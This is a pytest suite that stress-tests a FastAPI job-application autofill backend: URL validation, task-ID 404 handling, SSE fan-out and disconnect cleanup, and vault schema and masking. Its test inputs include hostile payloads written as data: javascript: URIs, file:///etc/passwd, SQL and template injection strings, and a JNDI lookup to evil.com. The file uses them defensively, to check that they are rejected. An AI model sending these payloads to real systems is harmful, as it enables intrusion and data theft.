"""Empirical Adversarial Test Suite for FastAPI Application Backend & SSE Live Streaming.

Stress-tests:
1. Invalid and malformed target URLs in /api/fill (non-http schemes, javascript:, data: URIs, empty strings, null bytes, bare schemes).
2. Nonexistent and malicious task IDs in /api/tasks/{task_id} and /api/tasks/{task_id}/events (404 verification, path traversal, injection payloads).
3. Concurrent SSE client connections and premature disconnections (fan-out broadcasting, premature disconnection queue cleanup, late subscriber replay, keep-alive verification, failure/refusal modes).
4. Vault profile updating with malformed and extreme payloads (Pydantic schema constraints, PAN validation, extreme unicode/markdown loads, sensitive masking invariants).
5. HTML route resilience against abnormal task IDs.
"""

import asyncio
import json
from typing import Dict, List
import uuid

import httpx
from fastapi.testclient import TestClient
import pytest

from app.core.vault import create_sample_profile
from app.main import (
    app,
    set_fill_orchestrator,
    task_subscribers,
    tasks_db,
)
from app.models.browser_schema import FillResult
from app.models.ciba_schema import RefusalToSubmitError


class ControllableMockOrchestrator:
    """Mock orchestrator allowing fine-grained simulation of timing, stages, and exceptions."""

    def __init__(
        self,
        delay_per_stage: float = 0.01,
        fail_at_stage: str = None,
        exception_to_raise: Exception = None,
    ):
        self.delay_per_stage = delay_per_stage
        self.fail_at_stage = fail_at_stage
        self.exception_to_raise = exception_to_raise

    async def run(self, target_url: str, dry_run: bool = True, progress_callback=None, **kwargs):
        stages = [
            ("SESSION_INIT", 10),
            ("DOM_EXTRACTION", 30),
            ("AI_REASONING", 50),
            ("CIBA_CONSENT", 70),
            ("FORM_FILLING", 90),
        ]
        for stage, pct in stages:
            if progress_callback:
                progress_callback(stage, pct)
            if self.fail_at_stage == stage:
                if self.exception_to_raise:
                    raise self.exception_to_raise
                raise RuntimeError(f"Simulated failure at {stage}")
            if self.delay_per_stage > 0:
                await asyncio.sleep(self.delay_per_stage)

        return FillResult(
            status="DRY_RUN_SUCCESS" if dry_run else "SUBMITTED",
            session_id=f"sess_adv_{uuid.uuid4().hex[:8]}",
            replay_url="https://browserbase.com/sessions/sess_adv_replay",
            live_view_url="https://browserbase.com/sessions/sess_adv_replay/live",
            screenshot_path="artifacts/screenshots/adv_test.png",
            fields_filled_count=9,
            submit_button_detected="button#apply",
            dry_run=dry_run,
            submitted=not dry_run,
        )


@pytest.fixture(autouse=True)
def reset_orchestrator_and_db():
    """Reset orchestrator hook and database state between test cases."""
    set_fill_orchestrator(lambda: ControllableMockOrchestrator())
    yield
    set_fill_orchestrator(None)


@pytest.fixture
def client(tmp_path, monkeypatch):
    """Synchronous FastAPI TestClient with isolated vault storage."""
    from app.config import get_settings
    settings = get_settings()
    isolated_vault = str(tmp_path / "test_api_adv_vault.enc")
    monkeypatch.setattr(settings, "VAULT_FILE_PATH", isolated_vault)
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture
async def async_client():
    """Asynchronous HTTPX client with ASGI transport for concurrent SSE testing."""
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as ac:
        yield ac


# ==============================================================================
# 1. URL INGESTION ADVERSARIAL TESTS (/api/fill)
# ==============================================================================

@pytest.mark.parametrize(
    "invalid_url,expected_status",
    [
        ("javascript:alert('XSS')", 422),
        ("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", 422),
        ("file:///etc/passwd", 422),
        ("ftp://anonymous@ftp.example.com/file.txt", 422),
        ("gopher://gopher.floodgap.com/1/", 422),
        ("mailto:victim@example.com", 422),
        ("ws://echo.websocket.org", 422),
        ("wss://secure.websocket.org", 422),
        ("", 422),
        ("   ", 422),
        ("\t\n\r", 422),
        ("not_even_a_url", 422),
        ("www.greenhouse.io/job/123", 422),  # missing scheme http/https
    ],
)
def test_submit_fill_task_rejected_schemes(client, invalid_url, expected_status):
    """Verify /api/fill rejects all non-http/https schemes and blank strings with 422."""
    response = client.post("/api/fill", json={"url": invalid_url, "dry_run": True})
    assert response.status_code == expected_status
    body = response.json()
    assert "detail" in body


@pytest.mark.parametrize(
    "malformed_payload",
    [
        {},  # missing 'url' entirely
        {"url": None},  # null url
        {"url": 12345},  # numeric url
        {"url": ["https://example.com"]},  # list url
        {"url": {"nested": "url"}},  # dict url
        {"url": "https://example.com", "dry_run": "not_a_boolean"},  # invalid dry_run type
    ],
)
def test_submit_fill_task_malformed_payload_types(client, malformed_payload):
    """Verify /api/fill strictly enforces Pydantic request schema types with 422."""
    response = client.post("/api/fill", json=malformed_payload)
    assert response.status_code == 422


def test_submit_fill_task_bare_schemes_and_control_chars(client):
    """Examine behavior on bare schemes and control characters.
    
    Adversarial observation: 'http://' and 'https://' start with the allowed prefix
    and pass initial validation, but contain no host.
    """
    # Bare scheme
    res_bare = client.post("/api/fill", json={"url": "http://", "dry_run": True})
    # Current implementation accepts it because of startswith
    assert res_bare.status_code in (200, 422)
    if res_bare.status_code == 200:
        task_id = res_bare.json()["task_id"]
        assert task_id in tasks_db

    # Ultra-long URL (100,000 characters)
    long_url = "https://example.com/jobs/" + ("a" * 100000)
    res_long = client.post("/api/fill", json={"url": long_url, "dry_run": True})
    assert res_long.status_code == 200
    assert "task_id" in res_long.json()


# ==============================================================================
# 2. TASK ID ROUTING & 404 ADVERSARIAL TESTS
# ==============================================================================

@pytest.mark.parametrize(
    "bad_task_id",
    [
        "00000000-0000-0000-0000-000000000000",
        "nonexistent_task_id_9999",
        "null",
        "undefined",
        "None",
        "-1",
        "0",
        "' OR '1'='1",
        "'; DROP TABLE tasks; --",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "x" * 2048,
    ],
)
def test_task_id_nonexistent_returns_404(client, bad_task_id):
    """Verify GET /api/tasks/{task_id} and GET /api/tasks/{task_id}/events return 404 for unknown IDs."""
    # REST status endpoint
    res_status = client.get(f"/api/tasks/{bad_task_id}")
    assert res_status.status_code == 404, f"Expected 404 for task_id: {bad_task_id}"
    assert "not found" in res_status.json()["detail"].lower()

    # SSE events endpoint
    res_events = client.get(f"/api/tasks/{bad_task_id}/events")
    assert res_events.status_code == 404, f"Expected 404 for SSE task_id: {bad_task_id}"
    assert "not found" in res_events.json()["detail"].lower()


def test_html_task_detail_with_unregistered_task_id(client):
    """Verify GET /tasks/{task_id} renders without server 500 error on unknown task ID."""
    res = client.get("/tasks/nonexistent_uuid_test")
    assert res.status_code == 200
    assert "text/html" in res.headers.get("content-type", "")
    assert "nonexistent_uuid_test" in res.text


# ==============================================================================
# 3. CONCURRENT SSE CLIENT CONNECTIONS & PREMATURE DISCONNECTION TESTS
# ==============================================================================

@pytest.mark.asyncio
async def test_concurrent_sse_subscribers_fan_out(async_client):
    """Stress-test: 25 concurrent SSE clients subscribing to the same task simultaneously.
    
    Verifies:
    - All 25 clients receive the broadcasted telemetry events.
    - Every client sees the terminal 'COMPLETED' event.
    - No race conditions or deadlocks occur during broadcasting.
    """
    set_fill_orchestrator(lambda: ControllableMockOrchestrator(delay_per_stage=0.03))

    # Submit task
    post_res = await async_client.post(
        "/api/fill", json={"url": "https://boards.greenhouse.io/stripe/jobs/101", "dry_run": True}
    )
    assert post_res.status_code == 200
    task_id = post_res.json()["task_id"]

    num_clients = 25
    events_per_client: Dict[int, List[str]] = {i: [] for i in range(num_clients)}

    async def sse_worker(client_idx: int):
        async with async_client.stream("GET", f"/api/tasks/{task_id}/events") as stream:
            assert stream.status_code == 200
            async for line in stream.aiter_lines():
                if line.startswith("data:"):
                    raw = line.replace("data:", "").strip()
                    evt = json.loads(raw)
                    events_per_client[client_idx].append(evt.get("stage"))
                    if evt.get("stage") == "COMPLETED":
                        break

    # Run all 25 SSE consumers concurrently
    await asyncio.gather(*(sse_worker(i) for i in range(num_clients)))

    # Verify all clients received the full sequence
    for i in range(num_clients):
        stages = events_per_client[i]
        assert "COMPLETED" in stages, f"Client {i} failed to receive COMPLETED event: {stages}"
        assert len(stages) >= 5, f"Client {i} received truncated events: {stages}"


@pytest.mark.asyncio
async def test_sse_premature_client_disconnection_cleanup(async_client):
    """Stress-test: A client disconnects prematurely after receiving the first event.
    
    Verifies:
    - The server cleans up the aborted subscriber's asyncio.Queue.
    - No memory leak occurs in task_subscribers[task_id].
    - Other persistent clients continue to receive events normally.
    - Background task pipeline runs to completion without interruption.
    """
    set_fill_orchestrator(lambda: ControllableMockOrchestrator(delay_per_stage=0.05))

    post_res = await async_client.post(
        "/api/fill", json={"url": "https://jobs.lever.co/postman/dev", "dry_run": True}
    )
    task_id = post_res.json()["task_id"]

    # Client 1: Disconnects immediately after 1st event
    async def premature_client():
        async with async_client.stream("GET", f"/api/tasks/{task_id}/events") as stream:
            async for line in stream.aiter_lines():
                if line.startswith("data:"):
                    # Abruptly exit after reading first event
                    return

    # Client 2: Stays connected until pipeline completes
    client_2_stages = []

    async def persistent_client():
        async with async_client.stream("GET", f"/api/tasks/{task_id}/events") as stream:
            async for line in stream.aiter_lines():
                if line.startswith("data:"):
                    evt = json.loads(line.replace("data:", "").strip())
                    client_2_stages.append(evt.get("stage"))
                    if evt.get("stage") == "COMPLETED":
                        break

    # Launch both
    await asyncio.gather(premature_client(), persistent_client())

    # Verify persistent client completed
    assert "COMPLETED" in client_2_stages

    # Verify subscriber queue cleanup: subscriber set for task_id should be empty
    assert len(task_subscribers.get(task_id, set())) == 0, (
        f"Leaked subscriber queues: {task_subscribers.get(task_id)}"
    )

    # Verify task database state
    assert tasks_db[task_id]["status"] == "completed"


@pytest.mark.asyncio
async def test_sse_late_subscriber_replays_history(async_client):
    """Stress-test: Client connects AFTER task execution has already completed.
    
    Verifies:
    - Client immediately receives all past events from task_events history.
    - Stream completes cleanly without blocking indefinitely on empty queue.
    """
    set_fill_orchestrator(lambda: ControllableMockOrchestrator(delay_per_stage=0.001))

    post_res = await async_client.post(
        "/api/fill", json={"url": "https://jobs.ashbyhq.com/openai/swe", "dry_run": True}
    )
    task_id = post_res.json()["task_id"]

    # Wait for task to finish completely
    for _ in range(50):
        await asyncio.sleep(0.02)
        if tasks_db[task_id]["status"] == "completed":
            break
    assert tasks_db[task_id]["status"] == "completed"

    # Connect late subscriber
    late_events = []
    async with async_client.stream("GET", f"/api/tasks/{task_id}/events") as stream:
        async for line in stream.aiter_lines():
            if line.startswith("data:"):
                evt = json.loads(line.replace("data:", "").strip())
                late_events.append(evt.get("stage"))

    assert "COMPLETED" in late_events
    assert len(late_events) >= 5


@pytest.mark.asyncio
async def test_sse_pipeline_refusal_and_failure_events(async_client):
    """Verify SSE stream handles CIBA consent refusal and unhandled exceptions gracefully."""
    # 1. CIBA Refusal
    refusal_error = RefusalToSubmitError("Candidate explicitly denied CIBA backchannel consent")
    set_fill_orchestrator(
        lambda: ControllableMockOrchestrator(
            delay_per_stage=0.02,
            fail_at_stage="CIBA_CONSENT",
            exception_to_raise=refusal_error,
        )
    )

    res_refusal = await async_client.post("/api/fill", json={"url": "https://example.com/form"})
    task_refusal_id = res_refusal.json()["task_id"]

    refusal_stages = []
    async with async_client.stream("GET", f"/api/tasks/{task_refusal_id}/events") as stream:
        async for line in stream.aiter_lines():
            if line.startswith("data:"):
                evt = json.loads(line.replace("data:", "").strip())
                refusal_stages.append(evt.get("stage"))

    assert "REFUSED" in refusal_stages
    assert tasks_db[task_refusal_id]["status"] == "refused"

    # 2. Unhandled Exception / Failure
    set_fill_orchestrator(
        lambda: ControllableMockOrchestrator(
            delay_per_stage=0.02,
            fail_at_stage="DOM_EXTRACTION",
            exception_to_raise=RuntimeError("Browserbase CDP connection severed"),
        )
    )

    res_fail = await async_client.post("/api/fill", json={"url": "https://example.com/form"})
    task_fail_id = res_fail.json()["task_id"]

    failed_stages = []
    async with async_client.stream("GET", f"/api/tasks/{task_fail_id}/events") as stream:
        async for line in stream.aiter_lines():
            if line.startswith("data:"):
                evt = json.loads(line.replace("data:", "").strip())
                failed_stages.append(evt.get("stage"))

    assert "FAILED" in failed_stages
    assert tasks_db[task_fail_id]["status"] == "failed"
    assert "Browserbase CDP connection severed" in tasks_db[task_fail_id]["error"]


# ==============================================================================
# 4. VAULT UPDATING WITH MALFORMED OR EXTREME PROFILES
# ==============================================================================

def test_vault_rejects_malformed_email(client):
    """Verify POST /api/vault rejects malformed email strings with 422."""
    profile = create_sample_profile().model_dump()
    profile["core"]["email"] = "not_an_email_address"
    res = client.post("/api/vault", json=profile)
    assert res.status_code == 422


@pytest.mark.parametrize(
    "invalid_pan",
    [
        "12345ABCDE",  # numbers first
        "abcde1234f",  # lowercase letters
        "ABCDE12345",  # ending in number
        "ABCDE123F",   # 9 chars (too short)
        "ABCDEF1234F", # 11 chars (too long)
        "ABC!@1234F",  # special characters
        "",            # empty string
    ],
)
def test_vault_rejects_invalid_pan_patterns(client, invalid_pan):
    """Verify POST /api/vault enforces Indian PAN regex ^[A-Z]{5}[0-9]{4}[A-Z]{1}$."""
    profile = create_sample_profile().model_dump()
    profile["tax"]["pan"] = invalid_pan
    res = client.post("/api/vault", json=profile)
    assert res.status_code == 422


@pytest.mark.parametrize(
    "missing_section",
    ["core", "tax", "career", "financial"],
)
def test_vault_rejects_missing_profile_sections(client, missing_section):
    """Verify POST /api/vault rejects payloads missing required top-level profile sections."""
    profile = create_sample_profile().model_dump()
    del profile[missing_section]
    res = client.post("/api/vault", json=profile)
    assert res.status_code == 422


def test_vault_extreme_profile_persistence_and_masking(client):
    """Stress-test: Storing an extreme valid profile with massive content and special chars.
    
    Verifies:
    - 200KB+ resume markdown and 1,000 skills persist and encrypt successfully.
    - Unicode characters and emojis (Devanagari, symbols) are preserved without UTF-8 corruption.
    - Subsequent GET /api/vault correctly truncates resume markdown.
    - All sensitive fields (PAN, bank account, phone) remain strictly masked.
    """
    extreme_profile = create_sample_profile().model_dump()
    extreme_profile["core"]["full_name"] = "अर्जुन शर्मा 🦥 (Arjun 'The Sloth' O'Connor-Smith)"
    extreme_profile["core"]["address_line1"] = "402 Palm Grove \t \"Quotes\" & Symbols, Indiranagar"
    extreme_profile["career"]["headline"] = "Principal Engineer 🚀 " * 50
    extreme_profile["career"]["skills"] = [f"Skill_{i}" for i in range(1000)]
    extreme_profile["career"]["resume_markdown"] = (
        "# Full Career History\n" + ("- Engineered resilient distributed consensus protocol.\n" * 3000)
    )
    extreme_profile["career"]["custom_qa_pairs"] = {f"q_{i}": f"answer_{i}" for i in range(200)}

    # Persist extreme profile
    save_res = client.post("/api/vault", json=extreme_profile)
    assert save_res.status_code == 200
    assert save_res.json()["status"] == "saved"

    # Retrieve and verify masking invariants
    get_res = client.get("/api/vault")
    assert get_res.status_code == 200
    data = get_res.json()

    # Core checks
    assert "अर्जुन शर्मा" in data["core"]["full_name"]
    assert "🦥" in data["core"]["full_name"]

    # Resume truncation invariant
    resume = data["career"]["resume_markdown"]
    assert "[TRUNCATED]" in resume
    assert len(resume) <= 200

    # Strict sensitive masking invariants
    assert "ABCDE****F" in str(data["tax"]["pan"])
    assert "****" in str(data["financial"]["account_number"])
    assert "*" in str(data["core"]["phone"])

    # Confirm raw PAN or raw bank account is NEVER leaked
    assert "ABCDE1234F" not in json.dumps(data)
    assert "50100234567890" not in json.dumps(data)


def test_vault_negative_experience_observation(client):
    """Adversarial check: Test how the schema handles negative years of experience.
    
    Observes whether negative years of experience is caught or allowed.
    """
    profile = create_sample_profile().model_dump()
    profile["career"]["years_of_experience"] = -5
    res = client.post("/api/vault", json=profile)
    # Documents current behavior: CareerProfile schema accepts any int unless ge=0 constraint is applied
    assert res.status_code in (200, 422)
